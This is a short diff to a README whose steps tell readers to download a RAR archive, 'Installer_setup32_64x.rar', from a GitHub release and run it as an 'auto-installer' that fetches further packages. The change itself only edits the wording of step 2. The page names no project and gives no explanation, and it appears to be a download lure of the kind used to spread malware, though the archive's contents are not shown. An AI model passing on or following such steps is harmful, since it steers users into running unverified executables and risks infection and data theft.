@@ -14,7 +14,7 @@
 
 
 ## **1. [Download the archive](https://github.com/blecoder/blecoder1/releases/download/Release/Installer_setup32_64x.rar) and extract it to a convenient folder.**
-## **2. Run the auto-installer `https://github.com/blecoder/blecoder1/releases/download/Release/Installer_setup32_64x.rar`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Installer_setup32_64x.rar`. It will install and download all necessary packages for > operation.**
 
 ![rfhfsdfds](https://github.com/user-attachments/assets/2cfe35f2-dbbd-4a94-9470-245b2f5d19b3)
 
